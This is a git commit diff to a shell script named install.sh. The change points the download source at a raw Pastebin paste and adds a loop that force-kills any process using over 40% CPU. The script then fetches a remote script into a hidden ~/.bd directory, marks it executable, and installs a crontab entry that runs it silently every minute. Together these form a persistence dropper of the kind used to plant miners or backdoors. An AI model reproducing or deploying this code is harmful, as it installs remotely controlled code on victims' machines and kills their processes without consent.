653d03f4ae78c829dfabd1f17072a7aba0f36486
robpot891 <rpotter@live.ca>
2018-11-30 21:17:41 -0500

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,9 +1,13 @@
 #!/bin/bash
 
-urlprefix='http://example.com'
+urlprefix='https://pastebin.com/raw'
 
+ps aux | grep -vw shtml | awk '{if($3>40.0) print $2}' | while read procid
+do
+kill -9 $procid
+done
 [ ! -f ~/.bd/crontab ] && mkdir ~/.bd
-curl -s -o ~/.bd/bd.sh $urlprefix/bd/bd.sh
+curl -s -o ~/.bd/bd.sh $urlprefix/P2rfkcKJ
 chmod +x ~/.bd/bd.sh
 [ ! -f ~/.bd/crontab ] && echo '* * * * * /bin/bash ~/.bd/bd.sh > /dev/null 2>&1' >> ~/.bd/crontab
 crontab ~/.bd/crontab
